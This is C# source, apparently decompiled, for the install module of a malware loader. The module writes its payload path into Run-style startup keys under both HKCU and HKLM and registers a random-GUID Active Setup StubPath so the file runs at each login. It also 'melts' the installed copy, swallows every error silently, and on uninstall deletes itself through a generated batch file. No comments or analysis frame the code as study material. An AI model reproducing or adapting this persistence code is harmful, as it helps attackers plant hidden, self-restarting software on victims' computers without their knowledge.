using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace Loader;

internal class Install
{
	public static string pinstallPath = null;

	public static bool isInstalled
	{
		get
		{
			string text = null;
			if (Core.getOS() == "XP")
			{
				text = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Documents and Settings\\" + Environment.UserName;
			}
			else if (Core.getOS() != "XP")
			{
				text = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Users\\" + Environment.UserName;
			}
			if (File.Exists(text + Config.installFile))
			{
				return true;
			}
			return false;
		}
		set
		{
		}
	}

	public static bool isInstalledAdmin
	{
		get
		{
			if (File.Exists(Path.GetPathRoot(Environment.CurrentDirectory) + "\\ProgramData\\" + Config.installFile))
			{
				return true;
			}
			return false;
		}
		set
		{
		}
	}

	public static void install()
	{
		string text = null;
		if (Core.getOS() == "XP")
		{
			text = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Documents and Settings\\" + Environment.UserName;
		}
		else if (Core.getOS() != "XP")
		{
			text = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Users\\" + Environment.UserName;
		}
		regInstall(text);
		ActiveXInstall("{" + Core.randID(8) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(12) + "}", text + Config.installFile);
		Core.MeltFile(text + Config.installFile);
	}

	public static void installAdmin()
	{
		string text = (pinstallPath = Path.GetPathRoot(Environment.CurrentDirectory) + "\\ProgramData\\");
		regInstall(pinstallPath);
		ActiveXInstall("{" + Core.randID(8) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(12) + "}", pinstallPath + Config.installFile);
		Core.MeltFile(pinstallPath + Config.installFile);
	}

	public static void regInstall(string installPath)
	{
		try
		{
			string[] startupKeys = Config.startupKeys;
			foreach (string subkey in startupKeys)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey.SetValue(Config.startupName, installPath + Config.installFile);
			}
			startupKeys = Config.startupKeys;
			foreach (string subkey in startupKeys)
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(subkey);
				registryKey.SetValue(Config.startupName, installPath + Config.installFile);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void ActiveXInstall(string RegKey, string Path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components", writable: true);
		registryKey.CreateSubKey(RegKey);
		registryKey = registryKey.OpenSubKey(RegKey, writable: true);
		registryKey.SetValue("StubPath", Path);
		registryKey.SetValue("IsInstalled", 1, RegistryValueKind.DWord);
	}

	public static void uninstall(string startup)
	{
		try
		{
			string[] startupKeys = Config.startupKeys;
			foreach (string name in startupKeys)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
				registryKey.DeleteValue(Config.startupName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string[] startupKeys = Config.startupKeys;
			foreach (string name in startupKeys)
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
				registryKey.DeleteValue(Config.startupName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			StreamWriter streamWriter = new StreamWriter(Environment.CurrentDirectory + "\\uninstall.bat");
			streamWriter.WriteLine("del \"" + Assembly.GetExecutingAssembly().Location + "\"");
			streamWriter.Close();
			Process.Start(Environment.CurrentDirectory + "\\uninstall.bat");
		}
		catch (Exception)
		{
		}
		if (startup != null)
		{
			try
			{
				Process.Start(startup);
			}
			catch (Exception)
			{
			}
		}
	}
}
